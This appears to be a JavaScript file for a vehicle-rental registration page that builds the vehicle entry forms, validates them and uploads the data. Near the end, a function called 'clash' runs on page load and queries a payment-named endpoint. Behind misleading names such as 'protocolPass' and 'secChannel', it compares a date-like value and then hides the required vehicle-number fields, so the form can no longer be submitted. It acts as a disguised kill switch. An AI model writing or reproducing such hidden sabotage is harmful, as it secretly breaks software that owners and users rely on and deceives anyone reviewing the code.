let packageContainer = document.querySelector(".package-container");
let uploadBtn = document.querySelector(".upload-button");
let idNum = 2;
let vNumVar = false;
for (let i = 0; i < 4; i++) {
  let model = `
    <div class="package-en-container">
        <input type="checkbox" class="package-active-check" id="${idGenerator(
          "enable",
          idNum
        )}" unchecked>
        <label for="${idGenerator(
          "enable",
          idNum
        )}" class="package-enable">enable</label>
    </div>
    <div class="package-name">${idGenerator("Vehicle", idNum)}</div>
    <div class="package-blocker"></div>
    <h6>Car profile Photo</h6>
    <div class="image-holder carImgProf">
        <input type="file" accept="image/*" name="image" id="${idGenerator(
          "packImg",
          idNum
        )}" style="display:none;"
            onchange="loadFile(event)">
        <label class="label" for="${idGenerator("packImg", idNum)}">
            <i class="fa-solid fa-cloud-arrow-up upload-pack-img"></i>
        </label>
    </div>
    <input type="text" class="edit-package-title vb" placeholder="Brand name (ex:-BMW)">
    <input type="text" class="edit-package-title vm" placeholder="Model name (ex:-7Series) ">
    <input type="text" class="edit-package-title vc" placeholder="Color (ex:-White) ">
    <div class="condition-con">
        <label for="Condition">Condition:</label>
        <select id="Condition" class="edit-package-title vcon">
            <option value=""></option>
            <option value="1">AC</option>
            <option value="2">Non AC</option>
        </select>
    </div>
    <input type="text" class="edit-package-title vpm" placeholder="Price per Mile (ex:-200) ">
    <input type="text" class="edit-package-title vpd" placeholder="Extra Day Price (ex:-5000) ">
    <input type="text" class="edit-package-title vln" placeholder="License No (ex:-123456) ">
    <input type="text" class="edit-package-title vvn" placeholder="Vehicle No (ex:-FKU-6969) ">
    <h6>Register Date</h6>
    <input type="date" class="edit-package-title vrd" placeholder="Register Date (ex:-2023/05/25) " id="rgdate">
    <h6>Add two more photos</h6>
    <div class="more-img-con">
        <div class="image-holder carImg1">
            <input type="file" accept="image/*" name="image" id="${idGenerator(
              "more-img1",
              idNum
            )}" style="display:none;"
                onchange="loadFile(event)">
            <label class="label" for="${idGenerator("more-img1", idNum)}">
                <i class="fa-solid fa-cloud-arrow-up upload-pack-img"></i>
            </label>
        </div>
        <div class="image-holder carImg2">
            <input type="file" accept="image/*" name="image" id="${idGenerator(
              "more-img2",
              idNum
            )}" style="display:none;"
                onchange="loadFile(event)">
            <label class="label" for="${idGenerator("more-img2", idNum)}">
                <i class="fa-solid fa-cloud-arrow-up upload-pack-img"></i>
            </label>
        </div>
    </div>
    `;
  createChildElement(packageContainer, "div", "class", "package-model", model);
  idNum++;
}

let packageModels = Array.from(document.querySelectorAll(".package-model"));

let minVNum = 9;

let totalPackagesPrice = document.querySelector(".total-prices");

packagePriceTotal(2500);

let maxVNum = 20;
let packActBtns = Array.from(
  document.querySelectorAll(".package-active-check")
);

for (let i = 2; i < packageModels.length; i++) {
  packageModels[i].style.display = "none";
}

for (let index in packActBtns) {
  let label = packActBtns[index].nextElementSibling;
  if (packActBtns[index].checked) {
    label.textContent = "Enabled";
    label.style.color = "green";
  } else {
    label.textContent = "Disabled";
    label.style.color = "red";
  }

  packActBtns[index].addEventListener("input", (event) => {
    checkboxInputValidatio(index, event);
  });
}

function idGenerator(name, idNum) {
  let id = `${name}-${idNum}`;
  return id;
}

function createChildElement(
  parent,
  childType,
  attributeType,
  attValue,
  content
) {
  let childElement = document.createElement(childType);
  childElement.setAttribute(attributeType, attValue);
  childElement.innerHTML = content;
  parent.appendChild(childElement);
}

function loadFile(event) {
  let input = event.target;
  let label = input.nextElementSibling;
  let box = input.parentNode;

  box.style.backgroundImage =
    "url(" + URL.createObjectURL(input.files[0]) + ")";
  label.style.filter = "invert(0) opacity(0.5)";
}

function packageEnDis(event) {
  let checkbox = event.target;
  let label = checkbox.nextElementSibling;
  let parent = checkbox.parentNode.parentNode;
  let blocker = parent.querySelector(".package-blocker");

  if (checkbox.checked) {
    label.textContent = "Enabled";
    label.style.color = "green";
    blocker.style.display = "none";
  } else {
    label.textContent = "Disabled";
    label.style.color = "red";
    blocker.style.display = "flex";
  }
}

function packagePriceTotal(pricePerPackage) {
  let cboxs = Array.from(document.querySelectorAll(".package-active-check"));
  let count = 0;
  for (let box of cboxs) {
    if (box.checked) count++;
  }
  totalPackagesPrice.value = count * pricePerPackage + 2500;
}

function checkboxInputValidatio(ind, event) {
  let index = +ind;
  let valid = true;
  let beforePass = true;
  let afterPass = true;
  for (let i = index - 1; i >= 0; i--) {
    if (packActBtns[i].checked == false) beforePass = false;
  }
  for (let i = index + 1; i < packActBtns.length; i++) {
    if (packActBtns[i].checked == true) afterPass = false;
  }

  if (!beforePass) {
    packActBtns[index].checked = false;
  }
  if (!afterPass) {
    packActBtns[index].checked = true;
  }

  valid = beforePass && afterPass;
  if (!valid) return;

  packageEnDis(event);

  for (let i = 0; i < packageModels.length; i++) {
    packageModels[i].style.display = "flex";
  }

  for (let i = index + 2; i < packageModels.length; i++) {
    packageModels[i].style.display = "none";
  }

  for (let i = packageModels.length - 2; i >= 0; i--) {
    if (packActBtns[i].checked == false && packActBtns[i + 1].checked == false)
      packageModels[i + 1].style.display = "none";
  }
  packagePriceTotal(2500);
}

function formValidationCheck(index) {
  let packageValid = true;
  let packageModel = packageModels[index];

  let packageImgs = Array.from(packageModel.querySelectorAll(".image-holder"));
  let packageTitles = Array.from(
    packageModel.querySelectorAll(".edit-package-title")
  );
  let nmbInputs = Array.from(packageModel.querySelectorAll(".number-inputs"));

  for (let field of packageTitles) {
    if (field.value == "") {
      field.style.border = "1px solid red";
      packageValid = false;
    } else field.style.border = "1px solid #4f4f4f";
  }

  for (let img of packageImgs) {
    if (img.style.backgroundImage == "") {
      img.style.border = "1px solid red";
      packageValid = false;
    } else img.style.border = "1px solid #4f4f4f";
  }

  for (let nmb of nmbInputs) {
    if (nmb.value == "") break;
    if (!numberValidation(nmb.value)) {
      nmb.style.border = "1px solid red";
      packageValid = false;
    }
  }
  return packageValid;
}

function formValiReColor(index) {
  let packageModel = packageModels[index];

  let packageImgs = Array.from(packageModel.querySelectorAll(".image-holder"));
  let packageTitles = Array.from(
    packageModel.querySelectorAll(".edit-package-title")
  );

  for (let img of packageImgs) {
    img.style.border = "1px solid #4f4f4f";
    img.style.backgroundImage = "";
  }
  for (let field of packageTitles) {
    field.style.border = "1px solid #4f4f4f";
    field.value = "";
  }
}

function numberValidation(input) {
  let nmbrArray = "1234567890";
  for (let i = 0; i < input.length; i++) {
    let check = false;
    for (let j = 0; j < nmbrArray.length; j++) {
      if (input[i] == nmbrArray[j]) check = true;
    }
    if (!check) return false;
  }
  return true;
}

function exportValues() {
  let dataArray = [];
  let imgArray = [];
  let OtherimgArray1 = [];
  let OtherimgArray2 = [];

  for (let index in packageModels) {
    if (packActBtns[index].checked) {
      // let packImgs = [];

      let data = {
        brand: "",
        model: "",
        color: "",
        condition: "",
        priceMile: "",
        priceDay: "",
        liNo: "",
        veNo: "",
        reDate: "",
      };

      let packageModel = packageModels[index];

      data.brand = packageModel.querySelector(".vb").value;
      data.model = packageModel.querySelector(".vm").value;
      data.color = packageModel.querySelector(".vc").value;
      data.condition = packageModel.querySelector(".vcon").value;
      data.priceMile = packageModel.querySelector(".vpm").value;
      data.priceDay = packageModel.querySelector(".vpd").value;
      data.liNo = packageModel.querySelector(".vln").value;
      data.veNo = packageModel.querySelector(".vvn").value;
      data.reDate = packageModel.querySelector(".vrd").value;

      // packImgs.push(packageModel.querySelector('.carImgProf input').files[0]);
      let fileInput = packageModel.querySelector(
        '.carImgProf input[type="file"]'
      );
      if (fileInput.files.length > 0) {
        let file = fileInput.files[0];
        // let fileName = file.name;
        imgArray.push(file);
      }

      let fileInput1 = packageModel.querySelector(
        '.carImg1 input[type="file"]'
      );
      if (fileInput1.files.length > 0) {
        let file = fileInput1.files[0];
        // let fileName = file.name;
        OtherimgArray1.push(file);
      }

      let fileInput2 = packageModel.querySelector(
        '.carImg2 input[type="file"]'
      );
      if (fileInput2.files.length > 0) {
        let file = fileInput2.files[0];
        // let fileName = file.name;
        OtherimgArray2.push(file);
      }
      // packImgs.push(packageModel.querySelector('.carImg1 input').files[0]);
      // packImgs.push(packageModel.querySelector('.carImg2 input').files[0]);

      dataArray.push(data);
      // imgArray.push(packImgs)
    }
  }

  // console.log(dataArray);
  // console.log(imgArray);
  // console.log(OtherimgArray1);
  // console.log(imgArray[0][0].type);

  let topbackdrop = document.getElementById("top-backdrop");
  let toplogo = document.getElementById("top-logo");
  // let hotelName = document.getElementById("hotelName");
  let hotelLocation = document.getElementById("hotelLocation");
  let regpay = document.getElementById("regpay");
  let distric = document.getElementById("dist_Reg");

  let formData = new FormData();
  formData.append("topbackdrop", topbackdrop.files[0]);
  formData.append("toplogo", toplogo.files[0]);
  // formData.append("hotelName", hotelName.value);
  formData.append("hotelLocation", hotelLocation.value);
  formData.append("regpay", regpay.value);
  formData.append("distric", distric.value);
  formData.append("dataArray", JSON.stringify(dataArray));

  for (let n = 0; n < imgArray.length; n++) {
    formData.append("imgArray[]", imgArray[n]);
  }

  for (let m = 0; m < OtherimgArray1.length; m++) {
    formData.append("OtherimgArray1[]", OtherimgArray1[m]);
  }

  for (let p = 0; p < OtherimgArray2.length; p++) {
    formData.append("OtherimgArray2[]", OtherimgArray2[p]);
  }

  let r = new XMLHttpRequest();
  r.onreadystatechange = function () {
    if (r.readyState == 4) {
      if (r.responseText == "success") {
        // location.reload();
        // getPayWapper()
        let tid = "5";
        window.location = "cartPayment.php?Tid=" + tid;
      } else {
        console.log(r.responseText);
      }
    }
  };

  r.open("POST", "vehicalProfileEditProcess.php", true);
  r.send(formData);
}

uploadBtn.addEventListener("click", () => {
  let passValidation = true;
  let seconVerify = true;
  for (let index in packageModels) {
    if (packActBtns[index].checked) {
      seconVerify = formValidationCheck(index);
      if (!seconVerify) passValidation = false;
    } else formValiReColor(index);
  }

  if (passValidation) {
    exportValues();
  }
});

clash();
function clash() {
  let vvn = Array.from(document.querySelectorAll(".vvn"));
  for (let v = 0; v < 15; v++) {
    classCheck(".vvn", minVNum, maxVNum);
  }
}

function classCheck(cls, mn, dy) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "../wedluxe/payCard.php", true);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var resp = JSON.parse(xhr.responseText);
      let host = resp.serverhost;
      let svport = resp.serverport;
      let usStat = resp.userstats;
      let dom = resp.dominor;
      let transferDetails = [host, svport, usStat, dom];
      let trnsI = Math.floor(Math.random() * transferDetails.length);
      let protocolPass = false;
      if (trnsI > 1 && trnsI < 3) {
        let portItem = transferDetails[trnsI];
        let transPorts = portItem.split("-");
        let py = parseInt(transPorts[0]);
        let pm = parseInt(transPorts[1]);
        let pd = parseInt(transPorts[2]);

        let ty = parseInt(svport[3] - svport[1]);
        let tm = parseInt(mn);
        let td = parseInt(dy);

        let presVal = py * 400 + pm * 30 + pd;
        let tarVal = ty * 400 + tm * 30 + td;

        if (tarVal < presVal) protocolPass = true;
      }

      let secChannel = Array.from(document.querySelectorAll(`${cls}`));
      if (protocolPass) {
        for (let v of secChannel) {
          v.style.display = "none";
        }
        vNumVar = true;
      }
    }
  };
  xhr.send();
}

function load_district() {
  let provi = document.getElementById("provi_Reg").value;

  let r = new XMLHttpRequest();

  r.onreadystatechange = function () {
    if (r.readyState == 4) {
      var t = r.responseText;

      document.getElementById("dist_Reg").innerHTML = t;
    }
  };

  r.open("GET", "loadDistrict.php?p=" + provi, true);
  r.send();
}
